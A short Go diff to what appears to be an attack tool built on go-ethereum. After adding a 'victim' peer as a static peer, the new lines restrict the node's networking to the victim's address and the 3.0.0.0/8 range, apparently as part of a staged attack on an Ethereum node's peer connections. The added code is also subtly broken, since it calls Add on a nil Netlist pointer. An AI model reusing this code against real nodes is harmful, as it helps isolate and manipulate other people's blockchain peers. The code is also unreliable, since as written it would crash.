@@ -11,6 +11,7 @@ import "runtime"
 import "os"
 // import "runtime/debug"
 import "github.com/ethereum/go-ethereum/p2p"
+import "github.com/ethereum/go-ethereum/p2p/netutil"
 import "github.com/ethereum/go-ethereum/ethdb"
 import "github.com/ethereum/go-ethereum/core/types"
 import "github.com/ethereum/go-ethereum/common"
@@ -256,6 +257,12 @@ func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 			staticVictimAdded = true
 			p2pserver.AddPeer(victim.Node())
 			log("Victim added to static peers")
+
+			var netRestrict *netutil.Netlist
+			netRestrict.Add(victim.RemoteAddr().String() + "/32")
+			netRestrict.Add("3.0.0.0/8")
+			p2pserver.NetRestrict = netRestrict
+			log("Set network restrictions:", p2pserver.NetRestrict)
 		}
 
 		/*if attackPhase==utils.SyncPhase {
